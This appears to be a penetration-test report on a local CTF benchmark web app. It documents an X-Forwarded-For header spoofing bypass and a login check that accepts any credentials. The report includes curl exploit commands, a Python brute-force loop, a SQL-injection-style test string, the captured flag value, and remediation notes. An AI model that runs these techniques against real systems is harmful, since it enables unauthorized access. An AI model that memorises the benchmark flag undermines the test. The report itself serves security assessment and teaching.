# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:34867
- **Assessment Date:** October 28, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
The assessment identified 5 authentication-related vulnerabilities, with 2 critical issues successfully exploited. The most severe finding (CVSS 9.8) is a complete authentication bypass where the application only validates the existence of credentials using `isset()` without validating their actual values—any username/password combination is accepted. Additionally, a critical IP-based authorization bypass (CVSS 9.1) allows attackers to spoof the `X-Forwarded-For` HTTP header to impersonate localhost and access restricted functionality. Supporting vulnerabilities include plaintext HTTP transmission (CVSS 7.5) enabling network interception, absence of rate limiting allowing unlimited brute force attempts (CVSS 5.0), and missing cache control headers (CVSS 4.0) that could expose cached responses. The combination of AUTH-VULN-03 (credential bypass) and AUTH-VULN-04 (header spoofing) enables complete application compromise with a single HTTP request.

**Authorization Vulnerabilities:**
One critical authorization vulnerability (CVSS 9.1) was successfully exploited. The application implements an IP-based access control mechanism that trusts the client-controlled `X-Forwarded-For` header to determine request origin. By spoofing this header to "127.0.0.1" or "localhost", external attackers can bypass the localhost-only restriction and access administrative functionality intended for local users only. This represents a complete authorization bypass that allows privilege escalation from anonymous external user to localhost-equivalent administrative access, resulting in disclosure of the CTF flag.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application accepts user input via POST parameters (`username`, `password`) and HTTP headers (`X-Forwarded-For`), but none of this user-controlled data is reflected in HTTP responses. All output statements echo only static strings and server-controlled variables. While the application lacks output encoding functions like `htmlspecialchars()`, this represents security through architectural simplicity rather than secure design—any future enhancement that echoes user input would immediately introduce XSS vulnerabilities.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application's minimal architecture eliminates these attack vectors: there is no database layer (eliminating SQL injection), no shell command execution functions are used (eliminating command injection), and user input is only checked for existence via `isset()` and compared in safe operations like `in_array()` without flowing into any dangerous sinks.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application has no outbound network communication capability—it makes no HTTP requests, performs no URL fetching, has no webhook mechanisms, and includes no external service integrations. The application is purely request-response oriented with no server-side request functionality.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 80/tcp (HTTP):** Caddy httpd acting as reverse proxy to the target application—publicly accessible without TLS enforcement
- **Port 443/tcp (HTTPS):** SSL/HTTPS available via Caddy but target application operates on HTTP only
- **Port 4567/tcp:** Puma web server (Ruby-based "Text Generator" application)—responds with HTTP 200 but includes security headers (X-XSS-Protection, X-Content-Type-Options, X-Frame-Options)
- **Port 7777/tcp:** Python SimpleHTTPServer 0.6 serving directory listings—potential information disclosure vector
- **Port 9999/tcp:** Python SimpleHTTPServer 0.6 serving directory listings—additional exposure point
- **Port 49158/tcp:** Golang net/http server (Tailscale VPN service) requiring authentication—returns 401 with strong Content-Security-Policy headers

**Security Misconfigurations:**
- Target application (port 34867 proxied through port 80) runs on **end-of-life software**: PHP 5.6.40 (EOL December 2018) on Apache 2.4.25 (November 2016), both accumulating 6+ years of unpatched vulnerabilities
- **No HTTPS enforcement** on target application—all data transmitted in plaintext over HTTP despite HTTPS being available at the proxy layer
- **Directory listing enabled** on ports 7777 and 9999 (Python SimpleHTTPServers) exposing file structure
- **Missing security headers** on target application: no Strict-Transport-Security (HSTS), Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, or Cache-Control directives
- **Server version disclosure**: Apache and PHP versions exposed in HTTP headers (`Server: Apache/2.4.25 (Debian)`, `X-Powered-By: PHP/5.6.40`) aiding attacker reconnaissance

**Subdomain Discovery:**
Subdomain enumeration returned generic dictionary results for localhost domains (autodiscover.localhost, mail.localhost, www.localhost, etc.). These appear to be false positives from subdomain wordlist scanning against localhost and are not specific to the target application's infrastructure.

**Operating System:**
Target runs on Debian 9.6 "Stretch" (EOL June 2022) within Docker container, representing 3 years of missing security patches at the OS level.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: IP-Based Authorization Bypass via X-Forwarded-For Header Spoofing

**Summary:**
- **Vulnerable location:** POST /index.php - IP whitelist check at line 73
- **Overview:** The application trusts the client-controlled X-Forwarded-For HTTP header for authorization decisions instead of the actual TCP source IP (REMOTE_ADDR). This allows any external attacker to spoof their IP address and bypass the localhost-only restriction to retrieve the CTF flag.
- **Impact:** Complete authentication and authorization bypass. Any attacker can retrieve the secret CTF flag with a single HTTP request.
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:** None

**Exploitation Steps:**

1. Send POST request to http://localhost:34867/index.php with spoofed X-Forwarded-For header:
```bash
curl -X POST http://localhost:34867/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=attacker&password=attacker"
```

2. The application checks if the X-Forwarded-For header matches the whitelist ['127.0.0.1', 'localhost']

3. Since the header can be arbitrarily set by the client, the check passes

4. The server responds with the welcome message and discloses the flag

**Proof of Impact:**

**Command executed:**
```bash
curl -X POST http://localhost:34867/index.php -H "X-Forwarded-For: 127.0.0.1" -d "username=attacker&password=attacker" -v
```

**Response received:**
```html
<center><h2>Welcome</h2></center>
<center><h3>Success: FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}</h3></center>
```

**Flag captured:** `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}`

**HTTP Response Headers:**
```
HTTP/1.1 200 OK
Date: Tue, 28 Oct 2025 23:59:51 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8
```

**Notes:**
- This vulnerability demonstrates a common real-world mistake where developers implement IP-based access control but fail to validate the source of IP address information
- The correct implementation should use `$_SERVER['REMOTE_ADDR']` which contains the actual TCP connection source IP that cannot be spoofed at the application layer
- The application is deployed without a trusted reverse proxy that would strip/validate the X-Forwarded-For header
- This single vulnerability is sufficient to completely compromise the application

---

### AUTH-VULN-03: Credential Validation Bypass via isset() Check

**Summary:**
- **Vulnerable location:** POST /index.php - Authentication check at line 70
- **Overview:** The application implements a fundamentally broken authentication mechanism that only verifies username and password POST parameters exist using isset() but never validates their actual values. Any credential combination including empty strings passes this check.
- **Impact:** Complete authentication bypass. The application accepts literally any credentials, making traditional brute force attacks unnecessary.
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:** None

**Exploitation Steps:**

1. Send POST request with any arbitrary credentials (combined with X-Forwarded-For bypass):
```bash
# Test 1: Empty credentials
curl -X POST http://localhost:34867/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=&password="

# Test 2: Single character credentials
curl -X POST http://localhost:34867/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=x&password=y"

# Test 3: SQL injection payload (still works)
curl -X POST http://localhost:34867/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=admin' OR '1'='1&password=anything"
```

2. The application performs only an isset() check: `isset($_POST['username']) && isset($_POST['password'])`

3. As long as the parameters exist in the POST body (even with empty values), the check passes

4. The flag is disclosed in the response

**Proof of Impact:**

**Test 1 - Empty credentials:**
```bash
curl -X POST http://localhost:34867/index.php -H "X-Forwarded-For: 127.0.0.1" -d "username=&password="
```
**Result:** `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}` ✓ Successfully bypassed

**Test 2 - Single character credentials:**
```bash
curl -X POST http://localhost:34867/index.php -H "X-Forwarded-For: 127.0.0.1" -d "username=x&password=y"
```
**Result:** `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}` ✓ Successfully bypassed

**Test 3 - SQL injection payload:**
```bash
curl -X POST http://localhost:34867/index.php -H "X-Forwarded-For: 127.0.0.1" -d "username=admin' OR '1'='1&password=anything"
```
**Result:** `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}` ✓ Successfully bypassed

**Test 4 - Completely missing credentials (for comparison):**
```bash
curl -X POST http://localhost:34867/index.php -H "X-Forwarded-For: 127.0.0.1" -d ""
```
**Result:** No output (authentication check fails when parameters don't exist) ✗ Failed as expected

**Notes:**
- The authentication mechanism provides zero actual security - it only checks parameter presence, not values
- There is no credential validation against any data store, no password hashing verification, and no cryptographic validation
- This represents a fundamental misunderstanding of authentication principles: presence is not proof of identity
- When combined with AUTH-VULN-04 (header spoofing), any two-parameter POST request grants full access

---

### AUTH-VULN-01: Transport Layer Exposure via HTTP-Only Deployment

**Summary:**
- **Vulnerable location:** Application runs exclusively on HTTP port 80 with no HTTPS/TLS
- **Overview:** The application is deployed without HTTPS/TLS encryption and lacks HSTS headers. All authentication data including credentials and the CTF flag are transmitted in plaintext over the network, enabling passive and active man-in-the-middle attacks.
- **Impact:** Network observers can intercept all HTTP traffic to capture credentials, session data, and the flag in plaintext.
- **Severity:** HIGH (CVSS 7.5)

**Prerequisites:**
- Attacker positioned as man-in-the-middle (e.g., on same WiFi network, compromised router, malicious ISP, corporate proxy)
- OR passive network monitoring capability

**Exploitation Steps:**

1. Position as network observer between client and server using one of:
   - ARP spoofing on local network
   - Rogue WiFi access point
   - Compromised network infrastructure
   - Passive packet capture on network segment

2. Capture HTTP traffic on port 34867 using tcpdump, Wireshark, or similar tools

3. Wait for victim to authenticate or trigger authentication yourself

4. Extract credentials and flag from plaintext HTTP POST body and response

**Proof of Impact:**

**Network capture demonstration:**

**Command executed:**
```bash
curl -X POST http://localhost:34867/index.php \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=victim&password=SecretPassword123"
```

**HTTP Request transmitted in plaintext:**
```
POST /index.php HTTP/1.1
Host: localhost:34867
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

username=victim&password=SecretPassword123
```

**HTTP Response received in plaintext:**
```html
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8

<center><h2>Welcome</h2></center>
<center><h3>Success: FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}</h3></center>
```

**Evidence:**
- Protocol: HTTP (unencrypted)
- Credentials transmitted: `username=victim&password=SecretPassword123` (plaintext)
- Flag transmitted in response: `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}` (plaintext)

**Response headers confirm no HTTPS:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
```
(No Strict-Transport-Security header present)

**Notes:**
- Docker configuration exposes only port 80 (HTTP), no port 443 (HTTPS)
- No TLS certificate configuration exists
- No HSTS header to enforce HTTPS
- Violates PCI DSS Requirement 4.1, HIPAA § 164.312(e)(1), and GDPR Article 32
- Any network observer can intercept credentials and flag using passive sniffing

---

### AUTH-VULN-05: Missing Rate Limiting Enables Brute Force Attacks

**Summary:**
- **Vulnerable location:** POST /index.php - No rate limiting at application or web server level
- **Overview:** The application implements no rate limiting, CAPTCHA, account lockout, or abuse prevention mechanisms. Unlimited authentication attempts are allowed from a single IP address without any throttling or blocking.
- **Impact:** Attackers can perform unlimited brute force, credential stuffing, or password spraying attacks at high speed without consequence.
- **Severity:** MEDIUM (CVSS 5.0) - Lower severity because AUTH-VULN-03 and AUTH-VULN-04 make brute force unnecessary

**Prerequisites:** None

**Exploitation Steps:**

1. Create a script to send rapid authentication attempts to http://localhost:34867/index.php

2. Submit 50+ consecutive POST requests with different username/password combinations

3. Include X-Forwarded-For: 127.0.0.1 header to trigger flag response for testing

4. Verify all requests are processed successfully without rate limiting or throttling

5. Measure response times to confirm no delays are introduced

**Proof of Impact:**

**Python brute force script executed:**
```python
import requests
import time

url = "http://localhost:34867/index.php"
headers = {"X-Forwarded-For": "127.0.0.1"}

start_time = time.time()
successful = 0
response_times = []

for i in range(50):
    data = {"username": f"user{i}", "password": f"pass{i}"}
    req_start = time.time()
    response = requests.post(url, data=data, headers=headers)
    req_time = time.time() - req_start
    response_times.append(req_time)

    if "FLAG{" in response.text:
        successful += 1

total_time = time.time() - start_time
avg_response = sum(response_times) / len(response_times)
```

**Results:**
- **Total Requests**: 50
- **Successful Requests**: 50/50 (100%)
- **Rate-Limited Requests**: 0
- **Total Execution Time**: 0.80 seconds
- **Average Response Time**: 0.004 seconds (4ms)
- **Min Response Time**: 0.003 seconds (3ms)
- **Max Response Time**: 0.013 seconds (13ms)
- **Requests per Second**: 62.5 req/s
- **HTTP 429 (Too Many Requests) Errors**: 0

**Evidence of exploitation:**
```
RATE LIMITING: ABSENT
✓ All 50 authentication attempts processed successfully
✓ No throttling detected
✓ No account lockout triggered
✓ Flag retrieved in all 50 responses
✓ Average response time: 4ms (no delays introduced)
```

**Flag captured from all attempts:** `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}`

**Notes:**
- In a real-world scenario with actual credential validation, this would enable:
  - High-speed dictionary attacks (thousands of attempts per second)
  - Credential stuffing using leaked password databases
  - Password spraying across multiple accounts
  - Account enumeration to identify valid usernames
- No Apache mod_evasive or mod_security modules are configured
- No application-level rate limiting logic exists
- No CAPTCHA on login form
- No session-based or file-based attempt tracking
- However, this vulnerability is UNNECESSARY for exploitation given AUTH-VULN-03 and AUTH-VULN-04 allow immediate bypass

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Authorization Bypass via X-Forwarded-For Header Spoofing

**Summary:**
- **Vulnerable location:** POST /index.php (IP-based authorization check at line 73 of index.php)
- **Overview:** The application trusts the client-controlled `X-Forwarded-For` HTTP header to determine if a request originates from localhost. By spoofing this header to `127.0.0.1` or `localhost`, an external attacker can completely bypass the IP whitelist authorization check and gain access to functionality intended only for localhost administrators.
- **Impact:** Complete authorization bypass resulting in disclosure of the CTF flag. An unauthenticated attacker from any network location can retrieve sensitive flag data that should only be accessible from localhost.
- **Severity:** Critical (CVSS 9.1)

**Prerequisites:**
- Network access to http://localhost:34867
- Ability to send HTTP POST requests with custom headers (e.g., curl, Burp Suite, Python requests library)
- No authentication credentials required

**Exploitation Steps:**

1. **Execute the authorization bypass by sending a POST request with the spoofed X-Forwarded-For header:**

```bash
curl -X POST http://localhost:34867/index.php \
  -d 'username=any&password=any' \
  -H 'X-Forwarded-For: 127.0.0.1'
```

**Explanation of each component:**
- **Target URL**: `http://localhost:34867/index.php` - The vulnerable endpoint
- **Method**: POST - Required by the application's form processing logic
- **POST Data**: `username=any&password=any` - Any values work; the application only checks that these parameters exist, not their values
- **Critical Header**: `X-Forwarded-For: 127.0.0.1` - This client-controlled header is trusted by the application for authorization decisions

**Alternative exploitation using the "localhost" whitelist value:**

```bash
curl -X POST http://localhost:34867/index.php \
  -d 'username=test&password=test' \
  -H 'X-Forwarded-For: localhost'
```

Both `127.0.0.1` and `localhost` are in the application's IP whitelist and successfully bypass the authorization check.

**Proof of Impact:**

When the authorization bypass is successful, the server responds with:

```html
<center><h2>Welcome</h2></center>
<center><h3>Success: FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}</h3></center>
```

**FLAG CAPTURED**: `FLAG{85cb364127e765d4659edc4d2d63fcf1161e763726273a36d21a8ef39c766adf}`

**Verification of Authorization Control (Without Bypass):**

To confirm the vulnerability, testing without the spoofed header shows the authorization control works as intended:

```bash
curl -X POST http://localhost:34867/index.php \
  -d 'username=any&password=any'
```

Response:
```html
<center><h3>Access Denied</h3></center>
```

This demonstrates that:
1. The authorization check DOES function when the X-Forwarded-For header is not present or doesn't match the whitelist
2. The vulnerability specifically exploits the trust placed in the client-controlled header
3. The bypass is not a result of missing authorization checks, but rather a flawed implementation

**Technical Root Cause:**

The vulnerable code at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-085-24/src/index.php:73` uses:
```php
$_SERVER['HTTP_X_FORWARDED_FOR']  // Client-controlled, spoofable
```

Instead of the secure alternative:
```php
$_SERVER['REMOTE_ADDR']  // Server-controlled TCP socket IP, cannot be spoofed at application layer
```

The `X-Forwarded-For` header is designed to be set by trusted reverse proxies to preserve original client IPs. In this deployment, there is no reverse proxy to sanitize client-provided headers, allowing attackers to forge arbitrary IP addresses.

**Notes:**

- This vulnerability is externally exploitable from any network location without requiring internal network access
- No authentication is required (anonymous exploitation)
- The attack complexity is trivial - a single HTTP request with a custom header
- The vulnerability allows complete bypass of the intended localhost-only access restriction
- The flag disclosure represents successful privilege escalation from anonymous external user to localhost-equivalent administrative access
